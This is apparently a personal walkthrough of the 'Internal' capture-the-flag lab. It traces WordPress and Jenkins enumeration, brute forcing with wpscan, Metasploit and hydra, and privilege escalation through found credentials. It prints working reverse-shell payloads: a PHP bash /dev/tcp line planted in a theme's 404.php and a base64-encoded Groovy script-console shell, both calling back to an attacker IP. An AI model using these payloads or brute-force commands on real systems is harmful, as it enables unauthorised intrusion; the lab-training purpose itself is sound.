INTERNAL.THM

we write inside the /etc/hosts our site internal.thm 

	sudo nano /etc/hosts

now it's time to enumerate with nmap,gobuster and wfuzz:

	nmap -sV internal.thm
	gobuster dir -u http://internal.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt -t 30
	wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://internal.thm -H "Host:FUZZ.internal.thm" --hl 375

nmap report that there are 22(SSH) and 80(Http), gobuster report some directory:(blog,wordpress,phpmyadmin), wfuzz nothing.
from gobuster we know that it is a wordpress it's time to run wpscan

	wpscan --force update -e --url http://internal.thm/wordpress
 
it seems that is enabled the xmlrhc, a protocol that is used to connect from everywhere to a wordpress site like a RPC, this protocol it allows to do ping and bruteforce so it should be set to off.
by running wpscan we had this output: 

	XML-RPC seems to be enabled: http://internal.thm/wordpress/xmlrpc.php
	 Found By: Direct Access (Aggressive Detection)
 	 Confidence: 100%
 	 References:
 	    http://codex.wordpress.org/XML-RPC_Pingback_API
		https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/

I visit this two link the that inside them there are some instruction in order to use modules from metasploit, the first one for the pingback and second one for bruteforce:

	use auxiliary/scanner/http/wordpress_pingback_access
	/set all options/
	run

	use auxiliary/scanner/http/wordpress_pingback_access
	/set options, especially the user and the wordlist in order to bruteforce/

after inside i retrieve some creds from a post written by the admin and I load a revshell php inside the 404.php into twentysevent theme.
here the revshell and command to connect it:

	exec("/bin/bash -c 'bash -i > /dev/tcp/10.8.98.143/4444 0>&1'");
	python3 -m pwncat
	connect -lp 4444

then load it we browse in the following url: http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php and we're inside the server.
Then uploading Linpeas-sh and run it, there isn't nothing so i had an idea to use find and retreieve some .txt:

	find / -name "*.txt" 2>/dev/null

Interesting file is:

	/opt/wp-save.txt

 i found inside the aubreanna credentials so i enter in her account, afert inside there is the first flag and a txt with a hint:

 	Internal Jenkins service is running on 172.17.0.2:8080 (jenkins is used to deploy of kubernetes)

so it's a must to do a port forward of this service and access by our terminal in order to do so i used this command:

	ssh -L 5555:127.0.0.1:8080 aubreanna@10.10.74.42
			|				!--> 8080 port of the jenkin's service
			|-> our port (5555 and our localhost)

so we bind the 8080 to our 5555, then we acces at the ssh in our shell, in order to activate the binding and then we search on th browser thi url:

	http://127.0.0.1:5555 (jenkin's service)

the default creds of jerkin's services are admin and password but does'nt work so i try to do a bruteforce with hydra and the following command:

	hydra 127.0.0.1 -s 5555 -V -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" -l admin -P /usr/share/wordlists/rockyou.txt
	
after inside it's time to load a revshell, we go to /script and we upload a groovy script, the following command:

	def sout = new StringBuffer(), serr = new StringBuffer()
	def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44Ljk4LjE0My82NjY2IDA+JjEn}|{base64,-d}|{bash,-i}'.execute()
	proc.consumeProcessOutput(sout, serr)
	proc.waitForOrKill(1000)
	println "out> $sout err> $serr"
	pwncat connect -lp 55555

finally we're inside, first I upload linpeas.sh in /tmp but there isn't interesting so I search in /opt and I find a note.txt, i search in this folder because there are very high chanche that if there was a password here, it will be in the future in the same spot, so i find it.
the passwd it's for the main webserver and not for jenkins  